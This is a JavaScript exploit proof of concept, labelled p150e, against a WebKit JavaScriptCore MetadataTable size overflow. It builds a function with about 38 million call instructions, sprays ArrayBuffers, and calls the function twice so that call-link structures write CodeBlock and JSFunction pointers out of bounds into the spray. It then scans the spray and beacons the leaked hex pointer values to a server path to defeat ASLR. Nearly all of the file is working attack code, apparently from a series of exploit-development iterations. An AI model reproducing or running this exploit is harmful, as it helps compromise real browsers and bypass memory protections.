// p150e — MetadataTable overflow: double-call ASLR leak
//
// CRITICAL FIX over p150d: linkFor() only writes pointer values on the
// SECOND call to each CallLinkInfo entry. First call sets seenOnce flag,
// second call triggers linkMonomorphicCall which writes:
//   - m_callee (JSFunction pointer)
//   - m_lastSeenCallee (same)
//   - m_codeBlock (CodeBlock pointer)
//   - m_monomorphicCallDestination (code entry point)
//
// These are ASLR-dependent pointers that reveal WebKit text base.
//
// Flow:
//   1. Build 38M op_call function (MetadataTable wraps to 100096 bytes)
//   2. Spray 200 zeroed 100KB ArrayBuffers after compile
//   3. FIRST call: throw at 960 → entries 894-959 get seenOnce set in spray
//   4. SECOND call: throw at 960 → entries 894-959 get linkMonomorphicCall → pointers!
//   5. Scan spray for non-zero 8-byte values → ASLR leak
//
// Beacon prefix: V150E-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150E-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  BS('BOOT');

  var BUF_SZ = 100096;
  var THROW_AT = 960;

  var postSprays = [];
  var postViews = [];

  // ---- PHASE 1: Build the 38M op_call function ----
  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p150fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p150ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  var blobMB = Math.round(blob.size / 1048576);
  BS('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p150ok ? 'OK' : 'FAIL';
    BS('COMPILED-' + ok);
    if (ok === 'OK') phaseSpray();
  };
  document.head.appendChild(sc);
  sc.src = url;

  // ---- PHASE 2: Post-compile spray ----
  function phaseSpray() {
    BS('SPRAY-START');

    for (var i = 0; i < 200; i++) {
      var ab = new ArrayBuffer(BUF_SZ);
      postSprays.push(ab);
      postViews.push(new Uint8Array(ab));
    }
    BS('SPRAY-200');

    setTimeout(phaseCall1, 100);
  }

  // ---- PHASE 3A: First call — primes seenOnce for OOB entries ----
  function phaseCall1() {
    BS('CALL1-START');

    var callCount = 0;
    try {
      window.__p150fn(function() {
        callCount++;
        if (callCount === 1) BS('C1-M1');
        if (callCount === 893) BS('C1-M893-LAST-IB');
        if (callCount === 894) BS('C1-M894-OOB');
        if (callCount === 900) BS('C1-M900');
        if (callCount === 950) BS('C1-M950');

        if (callCount >= THROW_AT) {
          throw new Error('p150e-bail1');
        }
      });
    } catch (e) {
      BS('C1-THREW-' + callCount);
    }

    BS('C1-TOTAL-' + callCount);

    if (callCount >= 894) {
      BS('C1-OOB-REACHED');
      setTimeout(phaseCall2, 50);
    } else if (callCount > 0) {
      BS('C1-CRASH-BEFORE-OOB-' + callCount);
    } else {
      BS('C1-ZERO-CALLS');
    }
  }

  // ---- PHASE 3B: Second call — linkMonomorphicCall writes pointers ----
  function phaseCall2() {
    BS('CALL2-START');

    var callCount = 0;
    try {
      window.__p150fn(function() {
        callCount++;
        if (callCount === 1) BS('C2-M1');
        if (callCount === 893) BS('C2-M893');
        if (callCount === 894) BS('C2-M894-OOB');
        if (callCount === 900) BS('C2-M900');
        if (callCount === 950) BS('C2-M950');

        if (callCount >= THROW_AT) {
          throw new Error('p150e-bail2');
        }
      });
    } catch (e) {
      BS('C2-THREW-' + callCount);
    }

    BS('C2-TOTAL-' + callCount);

    if (callCount >= 894) {
      BS('C2-OOB-REACHED');
      setTimeout(phaseScan, 50);
    } else {
      BS('C2-NO-OOB-' + callCount);
      setTimeout(phaseScan, 50);
    }
  }

  // ---- PHASE 4: Scan spray for written pointers ----
  function phaseScan() {
    BS('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;

    for (var i = 0; i < postViews.length; i++) {
      var view = postViews[i];
      if (!view) continue;

      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (hitBufs <= 5) {
          BS('HIT-' + i + '-nz' + nz + '-f' + firstOff);
        }

        // Dump 8-byte pointers at 112-byte stride (VERIFIED from WebKit-1200 source)
        // Entry 894 starts at spray offset 32 (if spray adjacent to MetadataTable)
        // BaselineCallLinkInfo (72B, JIT=OFF): ASLR pointers at entry+32..+56
        //   +32: u.dataIC.m_codeBlock (8B)         ← CodeBlock*
        //   +40: u.dataIC.m_monomorphicCallDest (8B)← code entry
        //   +48: m_calleeOrCodeBlock (8B)           ← JSFunction*
        //   +56: m_lastSeenCalleeOrExec (8B)        ← JSFunction*
        // First pointer at spray[32+32]=spray[64], stride 112

        var dumped = 0;
        // Check at entry offsets: 32, 144, 256, 368, 480, ...
        // (entry 894 at offset 32, stride 112)
        for (var entryOff = 32; entryOff + 112 <= view.length && dumped < 8; entryOff += 112) {
          var entryHasData = false;
          for (var c = entryOff; c < entryOff + 112 && c < view.length; c++) {
            if (view[c] !== 0) { entryHasData = true; break; }
          }
          if (!entryHasData) continue;
          dumped++;

          // Extract all 8-byte values within this entry
          var ptrs = '';
          var ptrCount = 0;
          for (var p = 0; p + 8 <= 112 && entryOff + p + 8 <= view.length; p += 8) {
            var anyByte = false;
            for (var v = 0; v < 8; v++) {
              if (view[entryOff + p + v] !== 0) { anyByte = true; break; }
            }
            if (anyByte) {
              var hex8 = '';
              for (var h = 7; h >= 0; h--) hex8 += hexByte(view[entryOff + p + h]);
              ptrs += '+' + p + ':' + hex8 + ' ';
              ptrCount++;
            }
          }

          var entryIdx = Math.round((entryOff - 32) / 112) + 894;
          if (ptrs.length < 180) {
            BS('E' + entryIdx + '@' + entryOff + '-' + ptrCount + 'ptrs-' + ptrs.trim());
          } else {
            BS('E' + entryIdx + '@' + entryOff + '-' + ptrCount + 'ptrs-LONG');
          }
        }

        // Also check non-stride-aligned data (in case offset calculation is wrong)
        if (hitBufs <= 2) {
          var chunks = '';
          var chunkCount = 0;
          for (var off = 0; off + 8 <= Math.min(view.length, 1024); off += 8) {
            var anyByte = false;
            for (var b = 0; b < 8; b++) {
              if (view[off + b] !== 0) { anyByte = true; break; }
            }
            if (anyByte && chunkCount < 12) {
              var hex8 = '';
              for (var h = 7; h >= 0; h--) hex8 += hexByte(view[off + h]);
              chunks += off + ':' + hex8 + ' ';
              chunkCount++;
            }
          }
          if (chunkCount > 0) {
            BS('RAW-' + i + '-' + chunks.trim());
          }
        }
      }
    }

    BS('RESULT-bufs' + hitBufs + '-nz' + totalNZ);

    if (hitBufs > 0) {
      BS('ASLR-LEAK-CANDIDATE');

      // Extract pointers at VERIFIED offsets within each entry
      // Entry 894 at spray[32], pointer fields at entry+32,+40,+48,+56
      var ptrNames = ['codeBlock', 'callDest', 'callee', 'lastSeen'];
      var ptrOffsets = [32, 40, 48, 56];
      var ptrCount = 0;

      for (var i = 0; i < postViews.length && ptrCount < 20; i++) {
        var view = postViews[i];
        if (!view) continue;

        for (var entryOff = 32; entryOff + 72 <= view.length && ptrCount < 20; entryOff += 112) {
          for (var pi = 0; pi < 4; pi++) {
            var pos = entryOff + ptrOffsets[pi];
            if (pos + 8 > view.length) break;

            var anyByte = false;
            for (var b = 0; b < 8; b++) {
              if (view[pos + b] !== 0) { anyByte = true; break; }
            }
            if (!anyByte) continue;

            var hex = '';
            for (var h = 7; h >= 0; h--) hex += hexByte(view[pos + h]);
            var entryIdx = Math.round((entryOff - 32) / 112) + 894;
            BS('LEAK-E' + entryIdx + '-' + ptrNames[pi] + '=' + hex);
            ptrCount++;
          }
        }
      }
    } else {
      BS('NO-HITS');
    }

    BS('DONE');
  }
})();
